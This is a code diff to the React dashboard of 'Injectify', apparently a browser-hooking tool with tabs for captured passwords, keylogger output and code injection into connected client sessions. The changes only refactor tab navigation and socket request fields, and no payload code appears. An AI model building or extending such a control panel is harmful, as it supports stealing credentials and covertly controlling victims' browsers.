@@ -68,6 +68,10 @@ function Transition(props) {
   return <Slide direction="up" {...props} />;
 }
 
+String.prototype.endsWith = function (s) {
+  return this.length >= s.length && this.substr(this.length - s.length) == s;
+}
+
 function escapeHTML(unsafe) {
   return unsafe
        .replace(/&/g, "&amp;")
@@ -421,10 +425,12 @@ class PersistentDrawer extends Component {
   }
 
   componentWillMount() {
-    if (window.location.href.slice(-10) == "/passwords") this.setState({tab: 0})
-    if (window.location.href.slice(-10) == "/keylogger") this.setState({tab: 1})
-    if (window.location.href.slice(-7 ) ==    "/inject") this.setState({tab: 2})
-    if (window.location.href.slice(-7 ) ==    "/config") this.setState({tab: 3})
+    let tab = 0
+    if (window.location.href.endsWith("/passwords")) tab = 1
+    if (window.location.href.endsWith("/keylogger")) tab = 2
+    if (window.location.href.endsWith("/inject")) tab = 3
+    if (window.location.href.endsWith("/config")) tab = 4
+    this.setState({ tab: tab })
   }
 
   componentDidMount() {
@@ -447,7 +453,7 @@ class PersistentDrawer extends Component {
         })
       } else if (this.state.currentProject && project === this.state.currentProject.name) {
         if (event == 'connect') {
-          let sessions = this.state.inject.clients
+          let sessions = this.state.inject.clients || {}
           sessions[session.token] = session.data
           this.setState({ 
             inject: {
@@ -553,7 +559,7 @@ class PersistentDrawer extends Component {
 
   saveAccounts = () => {
     localStorage.setItem("accounts", JSON.stringify(this.state.accounts))
-    if(this.state.accounts.length == 0) {
+    if (this.state.accounts.length == 0) {
       this.returnHome()
       this.props.signOut()
     }
@@ -608,23 +614,21 @@ class PersistentDrawer extends Component {
     })
   }
 
-  changeTab = (event, value) => {
+  changeTab = (event, i) => {
     let { socket, setTab } = this.props
-    let type = 'passwords'
-    if (value == 1) type = 'keylogger'
-    if (value == 2) type = 'inject'
-    if (value == 3) type = 'config'
+    let page = 'overview'
+    if (i === 1) page = 'passwords'
+    if (i === 2) page = 'keylogger'
+    if (i === 3) page = 'inject'
+    if (i === 4) page = 'config'
 
-    if (type == 'config') {
-      setTab(value)
-    } else {
-      this.loading(true)
-      socket.emit(`project:read`, {
-        name: this.state.currentProject.name,
-        type: type,
-      })
-    }
-    window.history.pushState('', this.state.currentProject.name + ' - Injectify', '/projects/' + encodeURIComponent(this.state.currentProject.name) + '/' + type)
+    this.loading(true)
+    socket.emit(`project:read`, {
+      project: this.state.currentProject.name,
+      page: page,
+    })
+
+    window.history.pushState('', `${this.state.currentProject.name} - Injectify`, `/projects/${encodeURIComponent(this.state.currentProject.name)}/${page !== 'overview' ? page : ''}`)
   }
 
   configPage = () => {
@@ -684,6 +688,7 @@ class PersistentDrawer extends Component {
                 fullWidth
                 className={classes.tabs}
               >
+                <Tab label="Overview" icon={<LockIcon />} disabled={loading} />
                 <Tab label="Passwords" icon={<LockIcon />} disabled={loading} />
                 <Tab label="Keylogger" icon={<KeyboardIcon />} disabled={loading} />
                 <Tab label="Inject" icon={<CodeIcon />} disabled={loading} />
@@ -714,10 +719,15 @@ class PersistentDrawer extends Component {
             <main
               className={`${classNames(classes.content, classes[`content`], {
                 [classes.contentShift]: open,
-              })} ${classes.tabsContent} ${tab === 2 && classes.injectMain} ${loading && classes.loadingMain}`}
+              })} ${classes.tabsContent} ${tab === 3 ? classes.injectMain : ''} ${loading && classes.loadingMain}`}
               ref={main => {this.main = main}}
             >
               {tab === 0 &&
+                <div>
+                  Overview
+                </div>
+              }
+              {tab === 1 &&
                 <span>
                   <Paper className={classes.paper}>
                     <Table>
@@ -934,7 +944,7 @@ class PersistentDrawer extends Component {
                   }
                 </span>
               }
-              {tab === 1 &&
+              {tab === 2 &&
                 <span>
                   <Paper className={classes.paper}>
                     <Table>
@@ -1071,10 +1081,10 @@ class PersistentDrawer extends Component {
                   }
                 </span>
               }
-              {tab === 2 && !this.state.hideMonaco &&
+              {tab === 3 && !this.state.hideMonaco &&
                 <Inject classes={classes} w={this.main ? this.main.offsetWidth : null} h={this.main ? this.main.offsetHeight : null} socket={this.props.socket} project={this.state.currentProject.name} ref={instance => { this.inject = instance }} clients={this.state.inject.clients} />
               }
-              {tab === 3 && 
+              {tab === 4 && 
                 <ProjectConfig classes={classes} project={this.state.currentProject} loggedInUser={this.props.parentState.user} emit={this.props.emit} loading={this.loading} socket={this.props.socket} loading={this.loading} token={this.props.token} />
               }
               <Tooltip title="New project" placement="left">
@@ -1179,25 +1189,20 @@ class Project extends Component {
     let { projectData, closeDrawer, emit, loading } = this.props.p
     let { parentState } = this.props.p.p
 
-    let type = 'passwords'
-    if (window.location.href.slice(-10) == "/keylogger") type = "keylogger"
-    if (window.location.href.slice(-7) == "/inject") type = "inject"
-    if (window.location.href.slice(-7) == "/config") type = "config"
+    let page = 'overview'
+    if (window.location.href.endsWith("/passwords")) page = 'passwords'
+    if (window.location.href.endsWith("/keylogger")) page = 'keylogger'
+    if (window.location.href.endsWith("/inject")) page = 'inject'
+    if (window.location.href.endsWith("/config")) page = 'config'
 
     if (parentState.width <= 700) closeDrawer()
     emit("project:close")
-    if (type !== 'config' && (!projectData || projectData.name !== record)) {
-      emit("project:read", {
-        name: this.props.record,
-        type: 'overview'
-      })
-    }
 		emit("project:read", {
-      name: this.props.record,
-      type: type
+      project: this.props.record,
+      page: page
     })
     loading(true)
-    window.history.pushState('', record + ' - Injectify', '/projects/' + encodeURIComponent(record) + '/' + type)
+    window.history.pushState('', `${record} - Injectify`, `/projects/${encodeURIComponent(record)}/${page !== 'overview' ? page : ''}`)
 	}
 
 	render() {
